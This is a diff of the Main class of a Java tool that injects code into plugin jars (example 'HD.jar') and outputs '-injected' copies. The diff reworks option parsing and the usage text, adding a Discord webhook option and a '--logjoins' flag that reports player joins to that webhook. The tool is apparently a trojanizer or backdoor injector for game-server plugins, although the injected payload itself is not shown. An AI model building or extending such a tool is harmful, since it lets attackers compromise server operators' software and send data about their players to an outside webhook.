@@ -13,22 +13,27 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class Main {
 
+    public static void printUsage(String name, String desc, String example){
+        System.out.println(" " + name + " : " + desc + " (ex : " + example + ")");
+    }
+
     public static void main(String[] args){
 
-        OptionsParser parser = new OptionsParser(args, "i", "input", "o", "output", "webhook");
+        OptionsParser parser = new OptionsParser(args, new String[]{"i", "input", "o", "output", "webhook"}, new String[]{"logjoins"});
 
         String input = parser.get("input", "i");
 
         if(input == null){
             /* usage */
-            System.out.println("\n╔══════════════════════ Usage ══════════════════════╗");
-            System.out.println("║                                                   ║ ");
-            System.out.println("║  java -jar injector.jar --input file.jar          ║ ");
-            System.out.println("║  java -jar injector.jar --input directory         ║ ");
-            System.out.println("║  java -jar injector.jar --i a.jar --o b.jar       ║");
-            System.out.println("║  java -jar injector.jar --i a.jar --webhook link  ║");
-            System.out.println("║                                                   ║");
-            System.out.println("╚═══════════════════════════════════════════════════╝");
+
+
+            System.out.println("***** USAGE *****");
+            printUsage("input", "The jar or directory to inject", "java -jar --input HD.jar");
+            printUsage("output", "The output jar or directory", "java -jar --input HD.jar --output HD-injected.jar");
+            printUsage("webhook", "Discord webhook", "java -jar --input HD.jar --webhook <link>");
+            printUsage("logjoins", "Logs to webhook when a player join the server", "java -jar --input HD.jar --webhook <link> --logjoins");
+
+            System.out.println("****************");
 
 
             return;
@@ -40,13 +45,13 @@ public class Main {
         }
 
         if(inputFile.isDirectory()){
-            Injector.injectDirectory(inputFile, parser.getDefault("output", "output"), parser.getDefault("", "webhook"));
+            Injector.injectDirectory(inputFile, parser.getDefault("output", "output"), parser);
             return;
         }
 
 
         String output = parser.getDefault(input.substring(0, input.length() - 4) + "-injected.jar", "o", "output");
-        Injector.inject(input, output, parser.getDefault("", "webhook"));
+        Injector.inject(input, output, parser);
 
 
 
